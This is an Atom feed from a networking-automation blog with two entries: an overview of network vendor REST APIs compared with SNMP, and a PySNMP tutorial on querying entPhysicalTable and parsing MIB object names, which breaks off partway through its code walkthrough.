<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-06-29T12:16:34-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">def brian(automate)</title><subtitle>Covering topics relating to networking and automation!</subtitle><author><name>Brian Yaklin</name></author><entry><title type="html">Network API’s Part 1 - Overview</title><link href="http://localhost:4000/2022/03/10/network-apis-part-1-overview.html" rel="alternate" type="text/html" title="Network API’s Part 1 - Overview" /><published>2022-03-10T00:00:00-07:00</published><updated>2022-03-10T00:00:00-07:00</updated><id>http://localhost:4000/2022/03/10/network-apis-part-1-overview</id><content type="html" xml:base="http://localhost:4000/2022/03/10/network-apis-part-1-overview.html">&lt;p&gt;Application programming interfaces (API’s) have become extremely popular with networking vendors over the past decade. This is a result of their flexibility, common data formats like JSON and XML, and the ubiquitous use of HTTP as a communication protocol. There is an ever growing need for network administrators to interface with the API’s that network vendors expose to them for the purpose of reporting, automation, incident isolation and resolution, and many other use cases unique to an organizations business. In this series of articles I cover what an API is and how to interface with it using Python (and a few other common tools), so that you may find some efficiency by applying a programmatic approach to some common or unique workflows that are labor intensive.&lt;/p&gt;

&lt;p&gt;This series of articles will use various “always on” &lt;a href=&quot;https://developer.cisco.com/site/sandbox/&quot;&gt;sandboxes&lt;/a&gt; (e.g. Meraki and Viptela) provided by Cisco. These sandboxes provide us with public read-only access via a web GUI and API, so that you can try these from your own workstation too.&lt;/p&gt;

&lt;h2 id=&quot;what-is-an-api&quot;&gt;What is an API?&lt;/h2&gt;

&lt;p&gt;An API is a piece of software that allows for communication between two applications. A simple form of an API in Python would be creating a module with a function that performs a particular task. The function definition (e.g. its name, what arguments it has, what task it performs or value it returns, and what errors it raises) is the API that you use when you import that function into your own script and call it, possibly providing some parameters. In the context of this article, I will be talking about &lt;a href=&quot;https://en.wikipedia.org/wiki/Representational_state_transfer&quot;&gt;Representational State Transfer&lt;/a&gt; (REST) API’s which utilize HTTP as their transport. REST API’s (referred to as API’s throughout the rest of this article) are used by various networking vendors because they provide a consistent and standardized way of delivering an API via HTTP to you as a customer and network administrator.&lt;/p&gt;

&lt;p&gt;Without getting too far into the weeds on the specifications that REST defines and how HTTP helps facilitate REST, it is good to understand that HTTP’s common usage of &lt;a href=&quot;https://en.wikipedia.org/wiki/Create,_read,_update_and_delete&quot;&gt;Create-Read-Update-Delete&lt;/a&gt; (CRUD) functions for working with data works really well with how we interact with the network devices we manage. For example:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Create: We may be creating configuration for a new deployment and configuring the network components. A Create is accomplished using HTTP verbs POST or PUT.&lt;/li&gt;
  &lt;li&gt;Read: Often times we need to report on the configuration, or metrics associated with components of a network device (e.g. utilization reports, hardware inventory, protocol status, etc.) A Read is accomplished using HTTP verb GET.&lt;/li&gt;
  &lt;li&gt;Update: Based on the information that we read from a devices we may need to take a particular action (e.g. we checked the current configured NTP server references on a network device, identified that they are not the latest servers, and are now updating those references with the correct NTP servers). An Update is accomplished using HTTP verbs POST or PUT.&lt;/li&gt;
  &lt;li&gt;Delete: Our networks are in a constant state of change based on business needs. As new requirements come and previous requirements disappear, we need to clean up the configuration on our network devices that are no longer necessary (e.g. removing a BGP peer that is no longer necessary, setting an interface configuration back to its default, etc.) A Delete is accomplished using HTTP verb DELETE.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;API’s provided by networking vendors help administrators interact with their devices using the above methods. Vendors expose as many of their features as possible to through their API’s so that administrators can be as quick and efficient as possible as well as extending the functionality of the product. For example you may have a 3rd party monitoring platform that has some analytical capabilities to help you prevent, diagnose and recover from incidents. Or you want to implement &lt;a href=&quot;https://en.wikipedia.org/wiki/Infrastructure_as_code&quot;&gt;Infrastructure as Code&lt;/a&gt; (IAC) using &lt;a href=&quot;https://www.terraform.io/&quot;&gt;Terraform&lt;/a&gt;, &lt;a href=&quot;https://www.ansible.com/&quot;&gt;Ansible&lt;/a&gt;, or through a number of products (open source or paid) that you come across. Perhaps you need to perform an ad-hoc task that you can’t find another solution for. With API’s you have the option to build the functionality yourself and perhaps share it with the world using a public version control system like Git on &lt;a href=&quot;https://github.com/&quot;&gt;Github&lt;/a&gt;. Want to gather statistics about a particular function running on a network device? Often times you can obtain those metrics using a vendors API. The options are limited only by your imagination.&lt;/p&gt;

&lt;h2 id=&quot;how-do-apis-compare-against-snmp&quot;&gt;How do API’s compare against SNMP?&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Simple_Network_Management_Protocol&quot;&gt;Simple Network Management Protocol&lt;/a&gt; (SNMP) has for a very long time been the go-to method for managing network devices. It has provided functionality to the administrator that allows them to read information from a device, configure new features or update existing ones. However, SNMP suffers from many setbacks compared to API’s served via HTTP, such as:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;It is often not implemented securely (only using SNMP v1 or v2c). API’s use standard HTTP calls which can be served securely from the network device via HTTPS.&lt;/li&gt;
  &lt;li&gt;It can be complex to authorization different users access to limit/restrict what each SNMP user can view and change. API’s commonly authorize your API calls the same way that you would be authorized when logging into the network device manually.&lt;/li&gt;
  &lt;li&gt;SNMP does not use a reliable transport (UDP), which means that you can miss key metrics data or have to re-send requests when a response isn’t seen. Because API’s use HTTP, TCP is used as a reliable transport.&lt;/li&gt;
  &lt;li&gt;You may need to install (on your management server/workstation) and reference different &lt;a href=&quot;https://en.wikipedia.org/wiki/Management_information_base&quot;&gt;MIB’s&lt;/a&gt; for different vendors or features, to get the functionality that you need. With API’s there is nothing additional to install other than the software that you want to make API calls with (e.g. &lt;a href=&quot;https://docs.python-requests.org/en/latest/&quot;&gt;Python Requests&lt;/a&gt; or &lt;a href=&quot;https://www.postman.com/&quot;&gt;Postman&lt;/a&gt;) no matter the type of network vendor whose API you are interacting with.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;api-documentation&quot;&gt;API Documentation&lt;/h2&gt;

&lt;p&gt;To interact with any API you need to know a few common details about the API, such as:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;How to you authenticate with the API.&lt;/li&gt;
  &lt;li&gt;Which API paths/end-points expose what information, and what information (parameters) do you need to pass to the end-point in your API call.&lt;/li&gt;
  &lt;li&gt;The format type (JSON, XML) and values that will be returned in the API response.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In having worked with many different vendors API’s in the past I can say that each has varying quality of documentation on how to use their API. Some vendors document their API’s in a friendly manner with examples, that make it easy for a network engineer (trying out scripting and automation) to learn the API’s, while other vendors are very strict and to the point with their documentation, meant more for someone heavily familiar with programming to interpret. There are typically a few ways that vendors will document their API’s (sometimes a vendor will use multiple methods):&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;On their website or in an admin guide.&lt;/li&gt;
  &lt;li&gt;On the network device or platform via an API explorer.&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Brian Yaklin</name></author><category term="Python" /><category term="Automation" /><summary type="html">Application programming interfaces (API’s) have become extremely popular with networking vendors over the past decade. This is a result of their flexibility, common data formats like JSON and XML, and the ubiquitous use of HTTP as a communication protocol. There is an ever growing need for network administrators to interface with the API’s that network vendors expose to them for the purpose of reporting, automation, incident isolation and resolution, and many other use cases unique to an organizations business. In this series of articles I cover what an API is and how to interface with it using Python (and a few other common tools), so that you may find some efficiency by applying a programmatic approach to some common or unique workflows that are labor intensive.</summary></entry><entry><title type="html">Parse PySNMP Object Identities for MIB Variable Names</title><link href="http://localhost:4000/2022/03/02/parse-pysnmp-object-names.html" rel="alternate" type="text/html" title="Parse PySNMP Object Identities for MIB Variable Names" /><published>2022-03-02T00:00:00-07:00</published><updated>2022-03-02T00:00:00-07:00</updated><id>http://localhost:4000/2022/03/02/parse-pysnmp-object-names</id><content type="html" xml:base="http://localhost:4000/2022/03/02/parse-pysnmp-object-names.html">&lt;p&gt;After using SNMP &lt;a href=&quot;/2022/01/11/pysnmp-hlapi-overview.html&quot;&gt;to query&lt;/a&gt; a remote device for a particular &lt;a href=&quot;https://pysnmp.readthedocs.io/en/latest/docs/api-reference.html#pysnmp.smi.rfc1902.ObjectType&quot;&gt;ObjectType&lt;/a&gt; and getting the response ObjectType (which includes the MIB identity and the corresponding value), it is useful to be able to programmatically parse the &lt;a href=&quot;https://pysnmp.readthedocs.io/en/latest/docs/api-reference.html#pysnmp.smi.rfc1902.ObjectIdentity&quot;&gt;PySNMP ObjectIdentity&lt;/a&gt;. This allows you to read the OID hierarchy and get a list human-readable MIB variable names for each node in the list.&lt;/p&gt;

&lt;p&gt;For example when querying for the contents of an SNMP table using the &lt;a href=&quot;/2022/01/16/bulk-data-gathering-with-pysnmp.html&quot;&gt;PySNMP bulkCmd&lt;/a&gt; you will get a large number of ObjectType responses correlating with each variable in the table that you queried. You’re most likely going to need to translate these responses into a different data structure; perhaps writing them to different columns in a database table, outputing to CSV file, or some other type of report. It is useful to understand which ObjectIdentity corresponds to which MIB variable name (which might represent your column in a CSV file, such as entPhysicalDescr) and perhaps an index value associated with that ObjectIdentity (e.g. entPhysicalIndex in the &lt;a href=&quot;https://oidref.com/1.3.6.1.2.1.47.1.1.1&quot;&gt;entPhysicalTable&lt;/a&gt;) as well as the response value. In this article I will be covering PySNMP’s ObjectType &lt;a href=&quot;https://pysnmp.readthedocs.io/en/latest/docs/api-reference.html#pysnmp.smi.rfc1902.ObjectIdentity.resolveWithMib&quot;&gt;resolveWithMib()&lt;/a&gt; function so that we can read the full hierarchy of the MIB variable.&lt;/p&gt;

&lt;p class=&quot;notice--info&quot;&gt;If you’re not already familiar with PySNMP’s bulkCmd for sending SNMP GETBULK requests check out my &lt;a href=&quot;/2022/01/16/bulk-data-gathering-with-pysnmp.html&quot;&gt;previous post&lt;/a&gt; to get familiar with querying SNMP tables!&lt;/p&gt;

&lt;h2 id=&quot;getting-started&quot;&gt;Getting Started&lt;/h2&gt;

&lt;p&gt;We’re going to focus on using &lt;a href=&quot;https://oidref.com/1.3.6.1.2.1.47.1.1.1&quot;&gt;entPhysicalTable&lt;/a&gt; in this example. This table contains details on all of the physical components of a particular network device such as the power supplies, fans, modules and their descriptions, serial numbers and other aspects that might be useful. Each hardware component is assigned a unique index value that is called entPhysicalIndex. You’ll need a copy of the &lt;a href=&quot;https://github.com/brianyaklin/net-hw-inventory/blob/main/mib/ENTITY-MIB.my&quot;&gt;ENTITY-MIB.my&lt;/a&gt; file and we will be following the PySNMP example for the &lt;a href=&quot;https://pysnmp.readthedocs.io/en/latest/examples/smi/manager/browsing-mib-tree.html#snmp-mib-browser&quot;&gt;SNMP MIB Browser&lt;/a&gt; pretty closely.&lt;/p&gt;

&lt;h2 id=&quot;building-a-mib-browser&quot;&gt;Building a MIB Browser&lt;/h2&gt;

&lt;p&gt;To build our MIB browser we need to import the builder, view, and compiler modules from pysnmp.smi and use them as follows:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pysnmp.smi&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;builder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;compiler&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;MIB_FILE_SOURCE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;file://.&apos;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;mib_builder&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;builder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MibBuilder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;compiler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addMibCompiler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mib_builder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sources&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MIB_FILE_SOURCE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;mib_builder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loadModules&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;ENTITY-MIB&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;mib_view&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MibViewController&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mib_builder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the above code we do a few different things:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;We import the necessary modules from pysnmp.smi&lt;/li&gt;
  &lt;li&gt;We create a mib_builder class instance&lt;/li&gt;
  &lt;li&gt;With the compiler module we tell PySNMP where to find our ENTITY-MIB.my file (which based on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file://.&lt;/code&gt; is located in the same folder as where we’re running the Python interpreter or our script, but you can specify a different path if your MIB file is located elsewhere). Note that the sources parameter allows you to provide multiple locations for MIB files&lt;/li&gt;
  &lt;li&gt;We then load the ENTITY-MIB.my file into our mib_builder class instance, followed by building a view of that MIB in the mib_view class instance&lt;/li&gt;
&lt;/ul&gt;

&lt;p class=&quot;notice--info&quot;&gt;With PySNMP’s MIB builder module we don’t need to &lt;a href=&quot;/2022/01/14/compiling-mibs-for-pysnmp.html&quot;&gt;pre-compile the MIB&lt;/a&gt; file into PySNMP format, we can leave it as the plain-text file.&lt;/p&gt;

&lt;p&gt;You’ll see in a later section how we’ll use the mib_view class instance, which contains a reference to the ENTITY-MIB, to parse response objects of the entPhysicalTable SNMP table.&lt;/p&gt;

&lt;h2 id=&quot;querying-the-entphysicaltable-snmp-table&quot;&gt;Querying the entPhysicalTable SNMP table&lt;/h2&gt;

&lt;p&gt;I have covered in other articles how to query &lt;a href=&quot;/2022/01/16/bulk-data-gathering-with-pysnmp.html&quot;&gt;SNMP tables&lt;/a&gt;, so this will just be a quick bit of code to get us started. We are going to query a device at IP address 192.168.11.201 which is a virtual router in my home lab. Unfortunately it doesn’t have much in terms of a values in the entPhysicalTablel but will work for this example anyways.&lt;/p&gt;

&lt;p&gt;The code is as follows:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pysnmp.hlapi&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SnmpEngine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UdpTransportTarget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;\
    &lt;span class=&quot;n&quot;&gt;ContextData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ObjectType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ObjectIdentity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bulkCmd&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pysnmp.hlapi&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CommunityData&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pysnmp.smi&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;builder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;compiler&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;auth&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CommunityData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;rostring&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mpModel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;object_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ObjectType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectIdentity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&apos;ENTITY-MIB&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;entPhysicalTable&apos;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addAsn1MibSource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;file://.&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;iterator&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bulkCmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SnmpEngine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;auth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;UdpTransportTarget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;192.168.11.201&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;161&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ContextData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;object_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;error_indication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error_index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;var_binds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iterator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If we take a look at the returned var_binds you can see that there is a single entry. Depending on the network device that you are querying for entPhysicalTable there can be a few values (such as a single value for my virtual router) or hundreds of values (in the case of larger network devices like modular switches):&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var_binds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;var_binds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prettyPrint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&apos;ENTITY-MIB::entPhysicalDescr.1 = IOSv chassis, Hw Serial#: 9ZEB8BXGIB6LD28LWUY1O, Hw Revision: 1.0&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;inspecting-objectidentitys-with-a-pysnmp-mib-view&quot;&gt;Inspecting ObjectIdentity’s with a PySNMP MIB View&lt;/h2&gt;

&lt;p&gt;In the previous section we were returned a single value for the entPhysicalTable, but lets just assume that we were returned multiple values. What we need to do is be able to parse the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ENTITY-MIB::entPhysicalDescr.1&lt;/code&gt; ObjectIdentity so that we can identify which particular MIB variable (entPhysicalDescr) and index value the var_bind was for. If you were just to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var_bind[0][0]&lt;/code&gt; you would get a string value of the entire OID chain of the variable name:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var_binds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;mf&quot;&gt;1.3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;6.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;2.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;47.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You could use PySNMP’s prettyPrint() function on the ObjectIdentity, but that just gives us the human-readable name of the fully qualified path for the MIB variable:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var_binds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prettyPrint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ENTITY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MIB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;entPhysicalDescr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;What we can do is use the mib_view class instance that we previously created. Lets first take a look at what this mib_view is. We can see that it is a MIB View controller:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mib_view&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;pysnmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;smi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MibViewController&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If you want to see the various class functions that it has, try using Python’s built-in help function like so: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;help(mib_view)&lt;/code&gt;. You can see that there is a class function called getNodeName(), which actually takes in an ObjectIdentity class and will return the oid, an ordered label tuple with human-readable entries, and the suffix which in our case is the entPhysicalIndex value. We use getNodeName() as follows:&lt;/p&gt;

